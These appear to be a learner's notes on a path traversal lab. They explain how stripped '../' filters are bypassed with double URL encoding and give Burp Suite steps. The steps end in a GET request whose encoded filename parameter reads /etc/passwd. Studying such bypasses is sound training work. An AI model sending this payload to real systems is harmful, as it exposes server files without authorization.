...
Concept : Path traversal is a vulnerability when an application uses user-controlled input to construct
          ...
          - In some contexts, such as in a URL path or the filename parameter of a multipart/form-data request, 
            ...
            such as ..%c0%af or ..%ef%bc%8f, may also work.
...
Analysis : strips "../"
[Developer coded in such a way that it block for all the filter '../' and removes all these filters and leaving '/etc/passwd' which is also blocked]

    /vsr/www/imges/65.jpg
    %2e%2e%2f/etc/passwd --> ../ characters This results in %2e%2e%2f --> decode THis results in ../

Exploit trick : double encode the complete path to bypass the filters and get unintended directory path.
...
Manual PenTest via burpsuite :
    ...
    4. Switch to Repeater tab & manipulate the URL
        [select given right click on '../../../etc/passwd' and click convert --> (url-encode all character)]
        
        URL : GET /image?filename=45.jpg HTTP/2
        Manipulated : GET /image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25
        %32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%3
        6%34 HTTP/2 
